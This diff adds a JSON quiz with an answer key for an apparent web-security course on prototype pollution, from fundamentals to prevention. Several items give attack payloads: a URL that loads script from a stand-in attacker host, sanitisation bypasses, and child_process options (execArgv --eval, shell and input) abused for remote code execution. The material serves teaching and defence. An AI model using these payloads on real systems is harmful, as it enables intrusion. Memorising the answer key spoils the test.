@@ -1,0 +1,443 @@
+{
+  "title": "Prototype Pollution",
+  "course": "WEBSEC",
+  "questions": [
+    {
+      "type": "mc",
+      "category": "Fundamentals",
+      "q": "What does prototype pollution fundamentally enable an attacker to do?",
+      "choices": [
+        "Add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects",
+        "Directly read the private key used to sign JSON Web Tokens",
+        "Overwrite the browser's same-origin policy for a single request",
+        "Force the server to disclose its source code over HTTP"
+      ],
+      "answer": 0,
+      "explain": "Prototype pollution lets an attacker add arbitrary properties to global object prototypes (most commonly Object.prototype), which are then inherited by other objects in the runtime."
+    },
+    {
+      "type": "mc",
+      "category": "Fundamentals",
+      "q": "Prototype pollution vulnerabilities most typically arise when a JavaScript function does what?",
+      "choices": [
+        "Recursively merges an object containing user-controllable properties into an existing object without sanitizing the keys",
+        "Encrypts user input with a weak cipher before storing it",
+        "Serializes an object to XML instead of JSON",
+        "Compares two objects using the === operator"
+      ],
+      "answer": 0,
+      "explain": "The classic pattern is a recursive merge of attacker-controlled data into an existing object without first sanitizing keys like __proto__."
+    },
+    {
+      "type": "multi",
+      "category": "Fundamentals",
+      "q": "Which three components are required for successful exploitation of prototype pollution?",
+      "choices": [
+        "A source",
+        "A sink",
+        "An exploitable gadget",
+        "A valid session cookie",
+        "A TLS downgrade"
+      ],
+      "answer": [0, 1, 2],
+      "explain": "Exploitation requires a source (input that poisons the prototype), a sink (a function or DOM element enabling code execution), and a gadget (a property passed to a sink without sanitization)."
+    },
+    {
+      "type": "text",
+      "category": "Fundamentals",
+      "q": "What special property key is the classic vector for referencing an object's prototype during a merge operation? (one word/token)",
+      "answer": ["__proto__"],
+      "explain": "Because __proto__ acts as a getter/setter for the prototype, assigning through it during a merge writes to the prototype instead of the object itself."
+    },
+    {
+      "type": "mc",
+      "category": "Fundamentals",
+      "q": "Which prototype object is most commonly the target of prototype pollution?",
+      "choices": [
+        "The built-in global Object.prototype",
+        "String.prototype only",
+        "A randomly chosen library prototype",
+        "The window object"
+      ],
+      "answer": 0,
+      "explain": "Although any prototype can be polluted, pollution most commonly targets the built-in global Object.prototype because nearly all objects inherit from it."
+    },
+    {
+      "type": "multi",
+      "category": "Fundamentals",
+      "q": "Which of the following are listed as common prototype pollution sources?",
+      "choices": [
+        "The URL via the query or fragment string (hash)",
+        "JSON-based input",
+        "Web messages",
+        "The operating system clock",
+        "CPU cache timing"
+      ],
+      "answer": [0, 1, 2],
+      "explain": "The common sources are the URL (query or fragment), JSON-based input, and web messages."
+    },
+    {
+      "type": "tf",
+      "category": "Fundamentals",
+      "q": "A property can serve as a gadget even if it is defined directly on the object itself.",
+      "answer": false,
+      "explain": "If the property is defined directly on the object, the object's own version takes precedence over any malicious version added to the prototype, so it cannot be a gadget."
+    },
+    {
+      "type": "mc",
+      "category": "Fundamentals",
+      "q": "For the config example where `transport_url` is used as a script src, what URL pollutes the prototype so the browser loads an attacker's script?",
+      "choices": [
+        "https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net",
+        "https://vulnerable-website.com/?transport_url=//evil-user.net",
+        "https://vulnerable-website.com/#transport_url=evil",
+        "https://vulnerable-website.com/?config=evil-user.net"
+      ],
+      "answer": 0,
+      "explain": "Polluting Object.prototype with a transport_url property via __proto__[transport_url] causes the config object to inherit it and set the script src to the attacker's domain."
+    },
+    {
+      "type": "mc",
+      "category": "JavaScript prototypes",
+      "q": "A JavaScript object is essentially what?",
+      "choices": [
+        "A collection of key:value pairs known as properties",
+        "A compiled bytecode module",
+        "A fixed-size array of 64-bit integers",
+        "A reference to a database row"
+      ],
+      "answer": 0,
+      "explain": "An object is a collection of key:value pairs called properties; properties holding functions are called methods."
+    },
+    {
+      "type": "mc",
+      "category": "JavaScript prototypes",
+      "q": "When you reference a property of an object, how does the JavaScript engine resolve it?",
+      "choices": [
+        "It first checks the object itself, then looks up the prototype chain if not found",
+        "It only checks the object itself and returns undefined otherwise",
+        "It only checks the global Object.prototype",
+        "It checks the prototype first, then the object"
+      ],
+      "answer": 0,
+      "explain": "The engine tries the object directly first; if the property is not found, it searches the object's prototype, continuing up the prototype chain."
+    },
+    {
+      "type": "mc",
+      "category": "JavaScript prototypes",
+      "q": "At the top of the prototype chain, what is the prototype of Object.prototype?",
+      "choices": [
+        "null",
+        "undefined",
+        "window",
+        "Object.prototype itself (it is circular)"
+      ],
+      "answer": 0,
+      "explain": "The chain ultimately leads back to the top-level Object.prototype, whose own prototype is null."
+    },
+    {
+      "type": "tf",
+      "category": "JavaScript prototypes",
+      "q": "`__proto__` serves as both a getter and a setter for an object's prototype.",
+      "answer": true,
+      "explain": "__proto__ can be used both to read the prototype (and its properties) and to reassign it."
+    },
+    {
+      "type": "text",
+      "category": "JavaScript prototypes",
+      "q": "Which method returns the prototype of a given object, e.g. Object.____(myObject) returns Object.prototype? Give the full method name.",
+      "answer": ["Object.getPrototypeOf", "getPrototypeOf"],
+      "explain": "Object.getPrototypeOf(myObject) returns the object's prototype, such as Object.prototype for a plain object literal."
+    },
+    {
+      "type": "mc",
+      "category": "JavaScript prototypes",
+      "q": "Why does `objectFromJson.hasOwnProperty('__proto__')` return true while the equivalent object literal returns false?",
+      "choices": [
+        "JSON.parse() treats __proto__ as an ordinary string key, so it becomes an own property",
+        "hasOwnProperty is broken for all strings",
+        "Object literals always create a __proto__ own property",
+        "JSON.parse() deletes the prototype of the result"
+      ],
+      "answer": 0,
+      "explain": "JSON.parse() treats any key, including __proto__, as an arbitrary string, so the parsed object gets a genuine own __proto__ property, unlike the literal where __proto__ is interpreted specially."
+    },
+    {
+      "type": "mc",
+      "category": "Client-side",
+      "q": "To manually confirm you polluted the prototype after visiting ?__proto__[foo]=bar, what should you check in the browser console?",
+      "choices": [
+        "Object.prototype.foo returns 'bar' (undefined means the attack failed)",
+        "window.location.foo is defined",
+        "document.cookie contains 'foo'",
+        "typeof foo === 'function'"
+      ],
+      "answer": 0,
+      "explain": "Inspecting Object.prototype.foo in the console: 'bar' confirms pollution succeeded; undefined indicates it did not."
+    },
+    {
+      "type": "mc",
+      "category": "Client-side",
+      "q": "When manually hunting gadgets, what console command adds a property to Object.prototype that logs a stack trace whenever it is read?",
+      "choices": [
+        "Object.defineProperty with a get() that calls console.trace() and returns 'polluted'",
+        "Object.freeze(Object.prototype)",
+        "Object.assign(Object.prototype, {})",
+        "delete Object.prototype.YOUR_PROPERTY"
+      ],
+      "answer": 0,
+      "explain": "Defining the property with a getter that calls console.trace() and returns 'polluted' reveals exactly where in the app the property is accessed."
+    },
+    {
+      "type": "mc",
+      "category": "Client-side",
+      "q": "If __proto__ is being stripped from keys, how can you still reach Object.prototype without using the __proto__ string?",
+      "choices": [
+        "Via the constructor property: myObject.constructor.prototype",
+        "Via myObject.__dirname",
+        "Via JSON.stringify(myObject)",
+        "Via Object.keys(myObject)"
+      ],
+      "answer": 0,
+      "explain": "myObject.constructor.prototype is equivalent to myObject.__proto__, giving an alternative vector when __proto__ is blocked."
+    },
+    {
+      "type": "mc",
+      "category": "Client-side",
+      "q": "The URL ?__pro__proto__to__.gadget=payload is designed to bypass which flawed defense?",
+      "choices": [
+        "Non-recursive sanitization that strips the string __proto__ only once",
+        "Object.freeze on the prototype",
+        "A null-prototype config object",
+        "A Content Security Policy"
+      ],
+      "answer": 0,
+      "explain": "If sanitization strips __proto__ only once, removing the inner __proto__ from __pro__proto__to__ leaves a valid __proto__ string behind."
+    },
+    {
+      "type": "tf",
+      "category": "Client-side",
+      "q": "DOM Invader can automatically detect prototype pollution sources and scan for gadgets, sometimes even generating a DOM XSS proof-of-concept.",
+      "answer": true,
+      "explain": "DOM Invader (in Burp's browser) automates source detection and gadget scanning, and can generate a DOM XSS PoC in some cases."
+    },
+    {
+      "type": "mc",
+      "category": "Browser APIs",
+      "q": "In the fetch() gadget, which undefined property of the options object can an attacker pollute to inject a malicious response-driven value leading to DOM XSS?",
+      "choices": [
+        "headers",
+        "credentials",
+        "integrity",
+        "signal"
+      ],
+      "answer": 0,
+      "explain": "Polluting Object.prototype with a headers property (e.g. containing a malicious x-username header) is inherited by the options object passed to fetch(), which can flow into an innerHTML sink."
+    },
+    {
+      "type": "mc",
+      "category": "Browser APIs",
+      "q": "A developer uses Object.defineProperty() to define a gadget property but sets no initial value. How can an attacker still control the property's value?",
+      "choices": [
+        "By polluting Object.prototype with a 'value' property that the descriptor object inherits",
+        "By polluting a 'configurable' property set to true",
+        "By calling Object.freeze on the descriptor",
+        "It cannot be bypassed once defined"
+      ],
+      "answer": 0,
+      "explain": "The descriptor passed to Object.defineProperty() is itself an object; if it inherits a polluted 'value' property, that attacker-controlled value is assigned to the defined property."
+    },
+    {
+      "type": "text",
+      "category": "Browser APIs",
+      "q": "What is the final JavaScript sink in the browser-APIs fetch() example where the attacker-controlled username value causes DOM XSS?",
+      "answer": ["innerHTML", ".innerHTML"],
+      "explain": "The username value derived from the polluted x-username header is assigned to message.innerHTML, producing DOM XSS."
+    },
+    {
+      "type": "multi",
+      "category": "Server-side",
+      "q": "Which factors make server-side prototype pollution harder to detect than client-side?",
+      "choices": [
+        "No access to the vulnerable source code",
+        "Lack of developer tools to inspect objects at runtime",
+        "Risk of inadvertently causing a denial-of-service",
+        "Pollution persists for the lifetime of the Node process",
+        "Browsers refuse to send __proto__ in requests"
+      ],
+      "answer": [0, 1, 2, 3],
+      "explain": "Server-side detection is harder due to no source access, no runtime inspection, the DoS risk from polluting real properties, and pollution persisting for the whole Node process lifetime."
+    },
+    {
+      "type": "mc",
+      "category": "Server-side",
+      "q": "Why can a `for...in` loop help detect server-side prototype pollution?",
+      "choices": [
+        "It iterates over enumerable inherited properties, so a polluted property can appear reflected in a response",
+        "It only iterates own properties and therefore hides pollution",
+        "It triggers a stack overflow when the prototype is polluted",
+        "It automatically freezes the prototype"
+      ],
+      "answer": 0,
+      "explain": "for...in iterates over all enumerable properties including inherited ones, so an injected prototype property can show up in a response that echoes the object's properties."
+    },
+    {
+      "type": "tf",
+      "category": "Server-side",
+      "q": "A for...in loop iterates over the non-enumerable built-in properties set by JavaScript's native constructors.",
+      "answer": false,
+      "explain": "Built-in properties set by native constructors are non-enumerable by default, so for...in does not include them."
+    },
+    {
+      "type": "num",
+      "category": "Server-side",
+      "q": "For the status code override technique, what status code does Node default to if the chosen status is not a valid number in the 400-599 range?",
+      "answer": 500,
+      "explain": "If the status is not a number or falls outside 400-599, Node sets it to 500, so you must pick a code in the 400-599 range to learn whether pollution worked."
+    },
+    {
+      "type": "mc",
+      "category": "Server-side",
+      "q": "Which Express option, when polluted, changes the indentation of JSON responses and makes an especially safe, reversible detection technique?",
+      "choices": [
+        "json spaces",
+        "view cache",
+        "trust proxy",
+        "strict routing"
+      ],
+      "answer": 0,
+      "explain": "The Express 'json spaces' option controls JSON indentation; polluting it changes indentation non-destructively and can be toggled back by resetting to the default."
+    },
+    {
+      "type": "mc",
+      "category": "Server-side",
+      "q": "In the charset override technique, polluting the prototype with which property causes a UTF-7 string to be decoded in the response?",
+      "choices": [
+        "content-type set to 'application/json; charset=utf-7'",
+        "accept-encoding set to gzip",
+        "transfer-encoding set to chunked",
+        "x-powered-by set to Express"
+      ],
+      "answer": 0,
+      "explain": "Polluting with a content-type property specifying charset=utf-7 causes body-parser to decode the body as UTF-7, revealing the decoded string in the response."
+    },
+    {
+      "type": "multi",
+      "category": "Server-side",
+      "q": "Which techniques are used to bypass input filters that block the __proto__ key for server-side prototype pollution?",
+      "choices": [
+        "Obfuscating the prohibited keyword so sanitization misses it",
+        "Accessing the prototype via the constructor property",
+        "Encrypting the request body with TLS 1.3",
+        "Sending the request over HTTP/2 only"
+      ],
+      "answer": [0, 1],
+      "explain": "Filters blocking __proto__ can be bypassed by obfuscating the keyword or by using the constructor property vector; even Node's --disable-proto flags can be bypassed via the constructor technique."
+    },
+    {
+      "type": "mc",
+      "category": "Server-side",
+      "q": "For black-box RCE detection, why is the prototype polluted with shell and NODE_OPTIONS values pointing at Burp Collaborator?",
+      "choices": [
+        "To trigger a Collaborator interaction whenever a new Node child process is created, identifying controllable requests",
+        "To immediately drop a reverse shell with no further steps",
+        "To disable the server's firewall",
+        "To overwrite the server's TLS certificate"
+      ],
+      "answer": 0,
+      "explain": "Combining a shell property with a malicious NODE_OPTIONS (e.g. --inspect pointing at Collaborator) causes an out-of-band interaction when a child process spawns, revealing which requests create controllable Node processes."
+    },
+    {
+      "type": "mc",
+      "category": "Server-side",
+      "q": "Which child_process.fork() option can be polluted to inject arbitrary command-line arguments such as --eval for RCE?",
+      "choices": [
+        "execArgv",
+        "cwd",
+        "detached",
+        "stdio"
+      ],
+      "answer": 0,
+      "explain": "fork()'s execArgv is an array of command-line arguments; if left undefined it can be polluted, and --eval lets you run arbitrary JavaScript in the child process."
+    },
+    {
+      "type": "multi",
+      "category": "Server-side",
+      "q": "For RCE via child_process.execSync(), which two properties are polluted together to run a malicious command?",
+      "choices": [
+        "shell",
+        "input",
+        "execArgv",
+        "cwd"
+      ],
+      "answer": [0, 1],
+      "explain": "execSync() does not accept execArgv, but polluting both shell (the shell to use) and input (the string piped to stdin and executed) lets you run a command of your choosing; editors like Vim or ex can serve as the stdin-reading shell."
+    },
+    {
+      "type": "mc",
+      "category": "Prevention",
+      "q": "Which method freezes a prototype so no properties can be modified or added, cutting off pollution sources?",
+      "choices": [
+        "Object.freeze(Object.prototype)",
+        "Object.assign(Object.prototype, null)",
+        "Object.keys(Object.prototype)",
+        "JSON.stringify(Object.prototype)"
+      ],
+      "answer": 0,
+      "explain": "Object.freeze(Object.prototype) prevents its properties from being modified and blocks adding new ones, proactively cutting off pollution sources."
+    },
+    {
+      "type": "mc",
+      "category": "Prevention",
+      "q": "How does Object.seal() differ from Object.freeze()?",
+      "choices": [
+        "Object.seal() still allows changes to the values of existing properties",
+        "Object.seal() deletes all existing properties",
+        "Object.seal() makes the object inherit from null",
+        "There is no difference"
+      ],
+      "answer": 0,
+      "explain": "Object.seal() prevents adding or removing properties but still allows existing property values to change, a possible compromise when freeze is not usable."
+    },
+    {
+      "type": "text",
+      "category": "Prevention",
+      "q": "Which method, called as Object.____(null), creates an object that inherits no properties at all (null prototype)?",
+      "answer": ["create", "Object.create"],
+      "explain": "Object.create(null) produces an object with a null prototype, so it inherits nothing and cannot be exploited via inherited gadgets."
+    },
+    {
+      "type": "mc",
+      "category": "Prevention",
+      "q": "Why is using a Map (instead of a plain object) a safer alternative for an options store?",
+      "choices": [
+        "Its get() method only returns properties defined directly on the map, not inherited ones",
+        "Maps cannot inherit any properties whatsoever",
+        "Maps automatically freeze Object.prototype",
+        "Maps reject any key containing underscores"
+      ],
+      "answer": 0,
+      "explain": "A Map can still inherit polluted properties, but its built-in get() returns only properties set directly on the map (e.g. options.get('evil') is undefined), avoiding the gadget."
+    },
+    {
+      "type": "mc",
+      "category": "Prevention",
+      "q": "Why is key sanitization via a blocklist recommended only as a stopgap rather than a long-term defense?",
+      "choices": [
+        "Robust blocklisting is hard: attackers bypass it via the constructor property or obfuscation",
+        "Blocklists are impossible to implement in JavaScript",
+        "Blocklists always break the application entirely",
+        "Blocklists only work on the server, never the client"
+      ],
+      "answer": 0,
+      "explain": "Blocklists that strip __proto__ can be defeated by the constructor vector or simple obfuscation, so they are a stopgap; an allowlist of permitted keys is more effective where feasible."
+    },
+    {
+      "type": "tf",
+      "category": "Prevention",
+      "q": "PortSwigger recommends patching prototype pollution vulnerabilities even when no exploitable gadget is currently known.",
+      "answer": true,
+      "explain": "Future updates to your code or libraries could introduce new gadgets, so the advice is to patch the pollution regardless of whether an exploitable gadget exists today."
+    }
+  ]
+}
